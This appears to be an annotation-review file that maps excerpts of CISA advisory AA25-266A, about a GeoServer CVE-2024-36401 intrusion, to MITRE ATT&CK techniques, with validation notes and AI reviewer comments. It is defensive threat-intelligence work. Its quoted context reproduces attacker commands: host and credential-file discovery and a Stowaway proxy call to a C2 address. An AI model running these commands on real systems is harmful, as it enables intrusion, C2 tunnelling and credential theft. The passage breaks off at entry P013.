# AA25-266A 标注审核

新提议按行为 ID 和映射 ID 在 review_decisions.json 中分别填写决策。

可用操作为 accept、edit、reject、insufficient_evidence。

## AA25-266A-G001

PDF 第 8 页 · observed · high · confirmed

**行为** identify current user → current user on SQL Server

**上下文说明** Read the surrounding paragraph/list in the source PDF before confirming this row.

**引文**

    whoami

**同页前后文**

     for the exploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir c:\ifwapps\Tier1Utilities 
     netstat -ano 
     curl 
     net user 
     tasklist 
    GeoServer 2 
    Based on images 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-M001 · T1033 System Owner/User Discovery · high · confirmed
  The command whoami returns the identity of the current user on the SQL server, which fits System Owner/User Discovery (T1033).

## AA25-266A-G002

PDF 第 8 页 · observed · high · confirmed

**行为** inspect network configuration → SQL Server network configuration

**上下文说明** Read the surrounding paragraph/list in the source PDF before confirming this row.

**引文**

    ipconfig /all

**同页前后文**

    xploited web services to gain remote access, achieve RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir c:\ifwapps\Tier1Utilities 
     netstat -ano 
     curl 
     net user 
     tasklist 
    GeoServer 2 
    Based on images CISA received of 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-M002 · T1016 System Network Configuration Discovery · high · confirmed
  The command ipconfig /all requests the SQL server's network adapter configuration, which fits System Network Configuration Discovery (T1016).

## AA25-266A-G003

PDF 第 8 页 · observed · high · confirmed

**行为** list running processes → processes on SQL Server

**上下文说明** Read the surrounding paragraph/list in the source PDF before confirming this row.

**引文**

    tasklist

**同页前后文**

     RCE, or move laterally. 
    The cyber threat actors also conducted ping sweeps of several hosts within the organization’s internal 
    subnets using fscan. Their use of the -nobr and -nopoc flags for fscan indicated that this scan 
    excluded brute forcing or vulnerability scanning, respectively. 
    SQL Server 
    CISA observed the following discovery commands on the organization’s SQL server: 
     whoami 
     ipconfig /all 
     ping -n 1 8.8.8.8 
     systeminfo 
     tasklist 
     dir c:\ 
     dir c:\Users 
     type c:\Last.txt 
     type c:\inetpub\wwwroot 
     type c:\inetpub\ 
     dir c:\inetpub\wwwroot 
     dir c:\ 
     dir c:\ifwapps 
     dir d:\ 
     dir e:\ 
     net group "domain admins" /domain 
     type C:\Windows\System32\inetsrv\config\applicationHost.config 
     dir c:\ifwapps\Tier1Utilities 
     netstat -ano 
     curl 
     net user 
     tasklist 
    GeoServer 2 
    Based on images CISA received of GeoServer 2, CISA observed the bash history of 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-M003 · T1057 Process Discovery · high · confirmed
  The command tasklist enumerates running processes on the SQL server, which fits Process Discovery (T1057).

## AA25-266A-G004

PDF 第 9 页 · observed · high · confirmed

**行为** proxy C2 traffic into the internal network → C2 traffic

**上下文说明** Read the surrounding paragraph/list in the source PDF before confirming this row.

**引文**

    Stowaway

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 9 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Lateral Movement 
    In one instance, the cyber threat actors moved laterally from the Web Server to the SQL Server by enabling 
    xp_cmdshell for RCE on GeoServer 1. 
    Command and Control 
    The cyber threat actors used PowerShell and bits admin getfile to download payloads.  
    They used Stowaway,  a  publicly available multi- level proxy tool, to establish C2. Stowaway 
    enabled the cyber threat actors to bypass the organization’s intranet restrictions and access internal 
    network resources by forwarding traffic from their C2 server through the Web Server. They wrote Stowaway 
    to disk using a tomcat service account. 
    The actors then executed Stowaway via /var/tmp/agent -c 45.32.22[.]62:4441 -s 
    f86bc7ff68aff3ad –up http –reconnect 10. 
    T

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-M004 · T1090 Proxy · high · confirmed
  Stowaway forwarded C2 traffic through the Web Server into the internal network. Forwarding traffic through an intermediary fits Proxy (T1090); the behavior is proxying rather than merely possessing the tool.

## AA25-266A-P001

PDF 第 4 页 · observed · high · draft

**行为** exploited a vulnerability to gain initial access → two GeoServers

**上下文说明** CISA summarizes the incident findings.

**引文**

    The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers.

**同页前后文**

    alerts. Over the three-week period, the cyber threat actors gained 
    separate initial access to a second GeoServer via the same vulnerability and moved laterally to two other 
    servers. 
    Leveraging insights CISA gleaned from the organization’s security posture and response, CISA is sharing 
    lessons learned for organizations to mitigate similar compromises (see Lessons Learned for more details): 
    1. Vulnerabilities were not promptly remediated. 
    a. The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers. 
    b. The vulnerability was disclosed 11 days prior to the cyber threat actors accessing the first 
    GeoServer and 25 days prior to them accessing the second GeoServer. 
    2. The agency did not test or exercise their incident response plan (IRP), nor did their IRP enable them 
    to promptly engage third parties and grant third parties access to necessary resources. 
    a. This delayed certain elements of CISA’s response as the IRP did not have procedures 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM001 · T1190 Exploit Public-Facing Application · high · draft
  The behavior describes exploiting a vulnerability on public-facing GeoServers to gain initial access, matching Exploit Public-Facing Application.

**候选** T1210, T1190, T1195.001, T1677, T1068, T1686.002, T1219.003, T1136.001, T1668, T1204.005, T1588.005, T1203, T1587.004, T1133, T1189, T1211, T1078.001, T1564.006, T1212, T1596.005, T1204.001, T1046, T1597.001, T1078
**映射复查** The report supports application exploitation for initial access. The expanded candidates do not support additional effects such as privilege escalation or credential access for this behavior.
- AI 复核 duplicate · This summary of CVE-2024-36401 exploitation for initial access on both GeoServers repeats P005 on page 6. Prefer the more detailed P005 evidence; keep the GeoServer 1 and GeoServer 2 occurrences distinct from each other.

## AA25-266A-P002

PDF 第 5 页 · observed · high · draft

**行为** exploited vulnerability to gain access and established persistence → agency network

**上下文说明** Initial access to GeoServer 1 occurred July 11, 2024.

**引文**

    During the incident response, CISA discovered that cyber threat actors gained access to the agency’s 
    network on July 11, 2024, by exploiting GeoServer vulnerability CVE 2024-36401 [CWE-95: “Eval 
    Injection”] on a public-facing GeoServer (GeoServer 1). This critical vulnerability, disclosed June 30, 2024, 
    allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions.  The 
    cyber threat actors used this vulnerability to download open source tools and scripts and establish 
    persistence in the agency’s network. (CISA added this vulnerability to its

**同页前后文**

    nical Details 
    Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 17. See the MITRE 
    ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to 
    MITRE ATT&CK tactics and techniques. 
    Threat Actor Activity 
    CISA responded to a suspected compromise of a large FCEB agency after the agency’s security operations 
    center (SOC) observed multiple endpoint security alerts. 
    During the incident response, CISA discovered that cyber threat actors gained access to the agency’s 
    network on July 11, 2024, by exploiting GeoServer vulnerability CVE 2024-36401 [CWE-95: “Eval 
    Injection”] on a public-facing GeoServer (GeoServer 1). This critical vulnerability, disclosed June 30, 2024, 
    allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions.  The 
    cyber threat actors used this vulnerability to download open source tools and scripts and establish 
    persistence in the agency’s network. (CISA added this vulnerability to its 
    1
    Known Exploited Vulnerabilities 
    (KEV) Catalog on July 15, 2024.) 
    After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a 
    second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved 
    laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) 
    server. On each server, they uploaded (or attempted to upload) web shells 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM002 · T1190 Exploit Public-Facing Application · high · draft
  The behavior states that the actors exploited a vulnerability in a public-facing GeoServer to gain access, matching Exploit Public-Facing Application.

**候选** T1190, T1136.001, T1195, T1210, T1686.002, T1677, T1133, T1189, T1203, T1588.005, T1195.001, T1078.001, T1546.008, T1564.006, T1592.002, T1187, T1550.001, T1068, T1553.004, T1671, T1574.001, T1588.002, T1055.001, T1212
**映射复查** The evidence supports exploitation of the public-facing GeoServer. Although the behavior also says persistence was established, it does not identify the mechanism, so no persistence technique is assigned.
- AI 复核 other · P002 combines the initial-access event with persistence establishment. Initial access is separately summarized in P001/P005, while specific persistence mechanisms are detailed in P006; consider separating the actions to avoid duplicating access and to keep persistence evidence precise.

## AA25-266A-P003

PDF 第 5 页 · unclear · high · draft

**行为** gained separate access and moved laterally; uploaded or attempted to upload web shells and scripts → GeoServer 2, Web Server, and SQL server

**上下文说明** The source groups upload and attempted upload together.

**引文**

    After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a 
    second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved 
    laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) 
    server. On each server, they uploaded (or attempted to upload) web shells such as China Chopper, along 
    with scripts designed for remote access, persistence, command execution, and privilege escalation. The

**同页前后文**

    ] on a public-facing GeoServer (GeoServer 1). This critical vulnerability, disclosed June 30, 2024, 
    allows unauthenticated users to gain remote code execution (RCE) on affected GeoServer versions.  The 
    cyber threat actors used this vulnerability to download open source tools and scripts and establish 
    persistence in the agency’s network. (CISA added this vulnerability to its 
    1
    Known Exploited Vulnerabilities 
    (KEV) Catalog on July 15, 2024.) 
    After gaining initial access to GeoServer 1, the cyber threat actors gained separate initial access to a 
    second GeoServer (GeoServer 2) on July 24, 2024, by exploiting the same vulnerability. They moved 
    laterally from GeoServer 1 to a web server (Web Server) and then a Structured Query Language (SQL) 
    server. On each server, they uploaded (or attempted to upload) web shells such as China Chopper, along 
    with scripts designed for remote access, persistence, command execution, and privilege escalation. The 
    cyber threat actors also used living off the land (LOTL) techniques. 
    See Figure 1 for an overview of the cyber threat actors’ activity and the following sections for detailed 
    threat actors TTPs. 
     
    Fi
    gure 1. Overview of Threat Actor Activity 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM003 · T1505.003 Web Shell · high · draft
  The behavior explicitly reports uploading or attempting to upload web shells, which directly matches the Web Shell technique.
- AA25-266A-PM004 · T1105 Ingress Tool Transfer · high · draft
  The behavior reports uploading web shells and scripts onto the servers, which is evidence of transferring files into the compromised environment.

**候选** T1078.001, T1210, T1195.001, T1611, T1574.001, T1677, T1133, T1555.003, T1505.003, T1546.012, T1105, T1546.004, T1564.006, T1550.001, T1059.004, T1526, T1552.003, T1037.004, T1053.002, T1037.005, T1190, T1059.002, T1104, T1574.011
**映射复查** The expanded definitions support both web shell use and ingress tool transfer. Lateral movement is explicit, but the behavior does not identify a specific remote-service mechanism.

## AA25-266A-P004

PDF 第 6 页 · observed · high · draft

**行为** scanned a public-facing server for a vulnerability → organization’s GeoServer

**上下文说明** CISA linked the scanning activity to the later exploitation source IP.

**引文**

    The cyber threat actors identified CVE-2024-36401 in the organization’s public-facing GeoServer using 
    Burp Suite Burp Scanner. CISA detected this scanning activity by analyzing web logs and 
    identifying signatures associated with the tool. Specifically, CISA observed domains linked to Burp 
    Collaborator—a component of Burp Suite used for vulnerability detection—originating from the same IP 
    address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access.

**同页前后文**

    TLP:CLEAR 
    CISA 
    Page 6 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Reconnaissance 
    The cyber threat actors identified CVE-2024-36401 in the organization’s public-facing GeoServer using 
    Burp Suite Burp Scanner. CISA detected this scanning activity by analyzing web logs and 
    identifying signatures associated with the tool. Specifically, CISA observed domains linked to Burp 
    Collaborator—a component of Burp Suite used for vulnerability detection—originating from the same IP 
    address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access. 
    Resource Development 
    The cyber threat actors used publicly available tools to conduct their malicious operations. In one instance, 
    they gained remote access to the organization’s network and leveraged a commercially available virtual 
    private server (VPS) from a cloud infrastructure provider. 
    Initial Access 
    To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401. They leveraged this vulnerabil

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM005 · T1595.002 Vulnerability Scanning · high · draft
  The actors scanned to identify a vulnerability in a public-facing GeoServer, directly matching Vulnerability Scanning.

**候选** T1190, T1665, T1210, T1596.005, T1595.002, T1686.002, T1211, T1068, T1564.006, T1587.004, T1598.003, T1596.004, T1588.005, T1681, T1595, T1596.003, T1590.005, T1677, T1589.001, T1133, T1589.002, T1590.002, T1595.001, T1597.001
**映射复查** The expanded set adds no more specific technique that is supported by the report’s description of reconnaissance.

## AA25-266A-P005

PDF 第 6 页 · observed · high · draft

**行为** exploited vulnerability to gain initial access using code injection → GeoServer 1 and GeoServer 2

**上下文说明** CISA attributes initial access to exploitation of the same vulnerability.

**引文**

    To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401. They leveraged this vulnerability to gain RCE by performing “eval injection,” a type of code 
    injection that allows an untrusted user’s input to be evaluated as code. The cyber threat actors likely

**同页前后文**

    ion—originating from the same IP 
    address the cyber threat actors later used to exploit the GeoServer vulnerability for initial access. 
    Resource Development 
    The cyber threat actors used publicly available tools to conduct their malicious operations. In one instance, 
    they gained remote access to the organization’s network and leveraged a commercially available virtual 
    private server (VPS) from a cloud infrastructure provider. 
    Initial Access 
    To gain initial access to GeoServer 1 and GeoServer 2, the cyber threat actors exploited CVE 2024-36401. They leveraged this vulnerability to gain RCE by performing “eval injection,” a type of code 
    injection that allows an untrusted user’s input to be evaluated as code. The cyber threat actors likely 
    attempted to load a JavaScript extension to gain webserver information as an Apache wicket on GeoServer 
    1. However, their efforts were likely unsuccessful, as CISA observed attempts to access the .js file 
    returning 404 responses in the web logs, indicating that the server could not find the requested URL. 
    Persistence 
    The cyber threat actors primarily used web shells on i nternet-facing hosts, along with cron 
    jobs (scheduled commands that r

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM006 · T1190 Exploit Public-Facing Application · high · draft
  The report identifies exploitation of a vulnerability on public-facing GeoServers to gain initial access, matching public-facing application exploitation.

**候选** T1210, T1677, T1068, T1190, T1203, T1187, T1189, T1211, T1195.001, T1212, T1078.001, T1548.005, T1659, T1574.001, T1548.003, T1681, T1553.001, T1098.007, T1098.005, T1668, T1070.006, T1548.002, T1098.001, T1546.008
**映射复查** The code-injection mechanism is described as exploitation for initial access. It does not establish client execution, privilege escalation, credential access, or another expanded candidate.

## AA25-266A-P006

PDF 第 6 页 · observed · high · draft

**行为** used web shells, scheduled jobs, and valid accounts for persistence → internet-facing hosts

**上下文说明** The report summarizes the persistence mechanisms used.

**引文**

    The cyber threat actors primarily used web shells on i nternet-facing hosts, along with cron 
    jobs (scheduled commands that run automatically at specified times), and valid accounts for persistence. CISA also identified the creation of accounts—although these accounts were later 
    deleted—with no evidence indicating further use.

**同页前后文**

    ion,” a type of code 
    injection that allows an untrusted user’s input to be evaluated as code. The cyber threat actors likely 
    attempted to load a JavaScript extension to gain webserver information as an Apache wicket on GeoServer 
    1. However, their efforts were likely unsuccessful, as CISA observed attempts to access the .js file 
    returning 404 responses in the web logs, indicating that the server could not find the requested URL. 
    Persistence 
    The cyber threat actors primarily used web shells on i nternet-facing hosts, along with cron 
    jobs (scheduled commands that run automatically at specified times), and valid accounts for persistence. CISA also identified the creation of accounts—although these accounts were later 
    deleted—with no evidence indicating further use. 
    Privilege Escalation 
    The cyber threat actors attempted to escalate privileges with the publicly available dirtycow tool,  w hich  
    can be used to exploit 
    2
    C
    VE-2016-5195 [CWE-362: “Race Condition”]. After compromising web 
    service accounts, they escalated their local privileges to transition away from these service accounts (it is 
    unknown how they escalated privileges). 
    Note: CVE-2016-5195 affects Linux kernel 2.x through 4.x before 4.8.3 

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM007 · T1053.003 Cron · high · draft
  Cron jobs are explicitly identified as a persistence mechanism, matching the Cron sub-technique.
- AA25-266A-PM008 · T1078 Valid Accounts · high · draft
  The behavior explicitly states that valid accounts were used for persistence, matching Valid Accounts.
- AA25-266A-PM009 · T1505.003 Web Shell · high · draft
  The report identifies web shells as a persistence mechanism, matching Web Shell.

**候选** T1053.003, T1053.002, T1574.001, T1053.007, T1133, T1053, T1070.006, T1505.004, T1114.003, T1546.004, T1078, T1505.003, T1547.001, T1553.003, T1608.006, T1690, T1195.001, T1098.001, T1070.003, T1564.006, T1053.006, T1548.005, T1546.012, T1134.004
**映射复查** The expanded definitions fit all three persistence mechanisms explicitly listed in the behavior. No narrower valid-account or scheduled-task sub-technique is established.

## AA25-266A-P007

PDF 第 6 页 · attempted · medium · draft

**行为** attempted privilege escalation and later escalated local privileges → local privileges on compromised hosts

**上下文说明** The report says the actors attempted escalation with a tool and separately reports local privilege escalation, with the method unknown.

**引文**

    The cyber threat actors attempted to escalate privileges with the publicly available dirtycow tool,  w hich  
    can be used to exploit 
    2
    C
    VE-2016-5195 [CWE-362: “Race Condition”]. After compromising web 
    service accounts, they escalated their local privileges to transition away from these service accounts (it is 
    unknown how they escalated privileges).

**同页前后文**

    nses in the web logs, indicating that the server could not find the requested URL. 
    Persistence 
    The cyber threat actors primarily used web shells on i nternet-facing hosts, along with cron 
    jobs (scheduled commands that run automatically at specified times), and valid accounts for persistence. CISA also identified the creation of accounts—although these accounts were later 
    deleted—with no evidence indicating further use. 
    Privilege Escalation 
    The cyber threat actors attempted to escalate privileges with the publicly available dirtycow tool,  w hich  
    can be used to exploit 
    2
    C
    VE-2016-5195 [CWE-362: “Race Condition”]. After compromising web 
    service accounts, they escalated their local privileges to transition away from these service accounts (it is 
    unknown how they escalated privileges). 
    Note: CVE-2016-5195 affects Linux kernel 2.x through 4.x before 4.8.3 and allows users to escalate 
    privileges. CISA added this CVE to its KEV Catalog on March 3, 2022. 
    Defense Evasion 
    To evade detection, the cyber threat actors employed indirect command execution via .php web shells and 
    xp_cmdshell and abused Background Intelligence Transfer Service (BITS) jobs. CISA 
    also observed files on GeoServer 1 named RinqQ.exe and RingQ.rar, which l

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM010 · T1068 Exploitation for Privilege Escalation · high · draft
  The behavior explicitly describes attempted privilege escalation using a tool associated with a privilege-escalation vulnerability and confirms that local privileges were later escalated.

**候选** T1098.001, T1105, T1068, T1133, T1078.001, T1210, T1556.006, T1543.005, T1546, T1070.003, T1574.001, T1190, T1548.002, T1548.004, T1543.003, T1608.004, T1547.001, T1176.001, T1546.012, T1136.001, T1550.001, T1564.006, T1546.008, T1203
**映射复查** The expanded candidate set does not establish how the later escalation occurred; the mapping is based on the explicit privilege-escalation behavior and not on a specific unreported technique.
- AI 复核 incorrect_fact_status · The same evidence says the actors attempted escalation with dirtycow and later did escalate local privileges, with the method unknown. A single attempted label understates the explicit successful escalation; split the attempted method from the observed outcome or represent both accurately.

## AA25-266A-P008

PDF 第 6 页 · observed · high · draft

**行为** used indirect command execution and abused transfer service jobs to evade detection → web shells and BITS jobs

**上下文说明** CISA describes these as defense evasion activity.

**引文**

    To evade detection, the cyber threat actors employed indirect command execution via .php web shells and 
    xp_cmdshell and abused Background Intelligence Transfer Service (BITS) jobs. CISA 
    also observed files on GeoServer 1 named RinqQ.exe and RingQ.rar, which likely refer to a publicly

**同页前后文**

     tool,  w hich  
    can be used to exploit 
    2
    C
    VE-2016-5195 [CWE-362: “Race Condition”]. After compromising web 
    service accounts, they escalated their local privileges to transition away from these service accounts (it is 
    unknown how they escalated privileges). 
    Note: CVE-2016-5195 affects Linux kernel 2.x through 4.x before 4.8.3 and allows users to escalate 
    privileges. CISA added this CVE to its KEV Catalog on March 3, 2022. 
    Defense Evasion 
    To evade detection, the cyber threat actors employed indirect command execution via .php web shells and 
    xp_cmdshell and abused Background Intelligence Transfer Service (BITS) jobs. CISA 
    also observed files on GeoServer 1 named RinqQ.exe and RingQ.rar, which likely refer to a publicly 
    available defense evasion tool called RingQ,  th at the cyber threat actors staged for potential use. 3
    Note: CISA could not recover most of the files on the host to confirm their contents. 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM011 · T1197 BITS Jobs · high · draft
  The report explicitly states that the actors abused BITS jobs, directly matching BITS Jobs.
- AA25-266A-PM012 · T1202 Indirect Command Execution · high · draft
  Indirect command execution through web shells and xp_cmdshell is explicitly described, matching Indirect Command Execution.

**候选** T1197, T1105, T1681, T1218.011, T1112, T1548.001, T1202, T1543.003, T1127.002, T1496.003, T1677, T1574.001, T1078.001, T1036.002, T1546.008, T1176.001, T1690, T1078, T1564.006, T1480.001, T1675, T1055.013, T1665, T1027.009
**映射复查** Both supplied definitions fit behaviors stated directly in the report. No other candidate is needed to represent these actions.

## AA25-266A-P009

PDF 第 7 页 · observed · high · draft

**行为** Performed ping sweeps and downloaded fscan for scanning → organization network

**上下文说明** Network discovery and scanning following initial access.

**引文**

    performed ping sweeps of hosts within specific subnets and do wnloaded the fscan tool  t o scan 4

**同页前后文**

     
    Page 7 of 19 | Product ID: AA25-266A 
    TLP:CLEAR 
     
     
    Credential Access 
    Once inside the organization’s network, the cyber threat actors primarily relied on brute force techniques to obtain passwords for lateral movement and privilege escalation. They also accessed service 
    accounts by exploiting their associated services. 
    Discovery 
    After gaining initial access, the cyber threat actors conducted discovery to facilitate lateral movement. They 
    performed ping sweeps of hosts within specific subnets and do wnloaded the fscan tool  t o scan 4
    the organization’s network. CISA identified the use of the fscan tool by analyzing evidence of its output 
    found on disk. (Note: fscan is publicly available on GitHub and is capable of port scanning, fingerprinting, 
    and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat 
    actors conducted extensive network and vulnerability scanning using fscan and linux-exploit-
    suggester2.pl. CISA’s host forensic

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM013 · T1595 Active Scanning · high · draft
  Ping sweeps and use of a scanning tool against the organization network are active scanning behavior.
- AA25-266A-PM014 · T1018 Remote System Discovery · high · draft
  Ping sweeps of hosts within specific subnets directly support remote system discovery.
- AA25-266A-PM015 · T1105 Ingress Tool Transfer · high · draft
  The behavior explicitly says the actors downloaded fscan into the environment, matching ingress tool transfer.
- AA25-266A-PM016 · T1588.002 Tool · medium · draft
  Downloading fscan supports acquisition of a software tool for the operation, matching the Tool sub-technique.

**候选** T1595, T1018, T1595.001, T1596.004, T1595.002, T1596.005, T1669, T1016.001, T1078, T1213, T1588.002, T1547.001, T1592.002, T1105, T1210, T1049, T1592, T1189, T1553.001, T1553.005, T1119, T1078.004, T1021.005, T1216.001
**映射复查** The behavior supports active scanning and host discovery, plus downloading a tool. The report does not specify IP-block enumeration or exploitation of the discovered systems.

## AA25-266A-P010

PDF 第 7 页 · observed · high · draft

**行为** Conducted network and vulnerability scanning → organization network

**上下文说明** Activity occurred July 15 to 31, 2024.

**引文**

    and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat 
    actors conducted extensive network and vulnerability scanning using fscan and linux-exploit-
    suggester2.pl. CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber

**同页前后文**

     services. 
    Discovery 
    After gaining initial access, the cyber threat actors conducted discovery to facilitate lateral movement. They 
    performed ping sweeps of hosts within specific subnets and do wnloaded the fscan tool  t o scan 4
    the organization’s network. CISA identified the use of the fscan tool by analyzing evidence of its output 
    found on disk. (Note: fscan is publicly available on GitHub and is capable of port scanning, fingerprinting, 
    and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat 
    actors conducted extensive network and vulnerability scanning using fscan and linux-exploit-
    suggester2.pl. CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber 
    threat actors left on disk. 
    GeoServer 1 
    The cyber threat actors leveraged CVE-2024-36401 to execute the following host discovery commands on 
    GeoServer 1: 
     uname-a 
     df-h 
     env 
     ps -aux 
     ipconfig 
     date 
     who -b 
     rpm -qa polkit 
     netstat -ano 
    Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on 
    GeoServer 1: 
     cat /etc/passwd 
     cat /etc/resolv.conf 
     cat /usr/local/apache-tomcat-

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM017 · T1595.002 Vulnerability Scanning · high · draft
  The behavior explicitly identifies vulnerability scanning, matching the Vulnerability Scanning sub-technique.

**候选** T1095, T1195.001, T1210, T1564.006, T1595.002, T1190, T1677, T1574.006, T1686.002, T1681, T1203, T1595.001, T1557.002, T1596.004, T1070.006, T1218.011, T1678, T1055.011, T1685.004, T1548.003, T1136.001, T1574.001, T1596.002, T1564.011
**映射复查** The report does not state that the scanning targeted IP blocks or involved exploitation; the specific vulnerability-scanning definition is supported.

## AA25-266A-P011

PDF 第 7 页 · observed · high · draft

**行为** Executed host discovery commands → GeoServer 1

**上下文说明** Detection summary; command details omitted.

**引文**

    The cyber threat actors leveraged CVE-2024-36401 to execute the following host discovery commands on 
    GeoServer 1:

**同页前后文**

    und on disk. (Note: fscan is publicly available on GitHub and is capable of port scanning, fingerprinting, 
    and web vulnerability detection—among other functions.) Between July 15 and 31, 2024, the cyber threat 
    actors conducted extensive network and vulnerability scanning using fscan and linux-exploit-
    suggester2.pl. CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber 
    threat actors left on disk. 
    GeoServer 1 
    The cyber threat actors leveraged CVE-2024-36401 to execute the following host discovery commands on 
    GeoServer 1: 
     uname-a 
     df-h 
     env 
     ps -aux 
     ipconfig 
     date 
     who -b 
     rpm -qa polkit 
     netstat -ano 
    Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on 
    GeoServer 1: 
     cat /etc/passwd 
     cat /etc/resolv.conf 
     cat /usr/local/apache-tomcat-9.0.89/webapps/geoserver/WEB-INF/web.xml 
     cat /etc/redhat-release 
     cat /etc/os-release  
    The cyber threat actors then used curl commands to download a she

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM018 · T1082 System Information Discovery · medium · draft
  The behavior identifies host-discovery commands run on GeoServer 1, consistent with gathering information about the host; the command details are omitted, limiting confidence.

**候选** T1677, T1210, T1059.013, T1564.006, T1686.002, T1218.011, T1195.001, T1546.004, T1136.001, T1680, T1018, T1082, T1543.003, T1497.001, T1690, T1106, T1547.001, T1564.001, T1654, T1543.002, T1070.003, T1070.010, T1580, T1027.011
**映射复查** The expanded set provides a plausible host-information discovery mapping, but the report omits the commands, so no more specific discovery technique can be confirmed.

## AA25-266A-P012

PDF 第 7 页 · observed · high · draft

**行为** Performed user, service, filesystem, and network discovery → GeoServer 1

**上下文说明** LOTL discovery activity.

**引文**

    Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on 
    GeoServer 1:

**同页前后文**

    s conducted extensive network and vulnerability scanning using fscan and linux-exploit-
    suggester2.pl. CISA’s host forensics analysts uncovered this activity by reviewing remnants the cyber 
    threat actors left on disk. 
    GeoServer 1 
    The cyber threat actors leveraged CVE-2024-36401 to execute the following host discovery commands on 
    GeoServer 1: 
     uname-a 
     df-h 
     env 
     ps -aux 
     ipconfig 
     date 
     who -b 
     rpm -qa polkit 
     netstat -ano 
    Additionally, they employed LOTL techniques for user, service, filesystem, and network discovery on 
    GeoServer 1: 
     cat /etc/passwd 
     cat /etc/resolv.conf 
     cat /usr/local/apache-tomcat-9.0.89/webapps/geoserver/WEB-INF/web.xml 
     cat /etc/redhat-release 
     cat /etc/os-release  
    The cyber threat actors then used curl commands to download a shell script named mm.sh (which they 
    renamed to aa.sh) and a zip file named aaa.zip to the /tmp/ directory. 
    

**自动验证** 引文、页码、偏移和正式契约均通过。

- AA25-266A-PM019 · T1033 System Owner/User Discovery · high · draft
  The behavior explicitly includes user discovery, matching System Owner/User Discovery.
- AA25-266A-PM020 · T1007 System Service Discovery · high · draft
  The behavior explicitly includes service discovery, matching System Service Discovery.
- AA25-266A-PM021 · T1083 File and Directory Discovery · high · draft
  The behavior explicitly includes filesystem discovery, matching File and Directory Discovery.
- AA25-266A-PM022 · T1016 System Network Configuration Discovery · medium · draft
  The behavior explicitly includes network discovery, consistent with System Network Configuration Discovery; the report does not specify which network information was collected.

**候选** T1049, T1046, T1680, T1210, T1055.009, T1557.001, T1016.002, T1543.002, T1497.002, T1124, T1033, T1007, T1083, T1016, T1498, T1499, T1690, T1574.005, T1201, T1110, T1195.001, T1098.001, T1557, T1580
**映射复查** The behavior names user, service, filesystem, and network discovery, supporting the corresponding host discovery techniques. It does not establish network-service scanning, Wi-Fi discovery, or cloud discovery.

## AA25-266A-P013

PDF 第 7 页 · observed · high · draft

**行为** Downloaded a shell script and an archive → GeoServer 1 temporary directory

**上下文说明** Script and archive names appear in the evidence.

**引文**

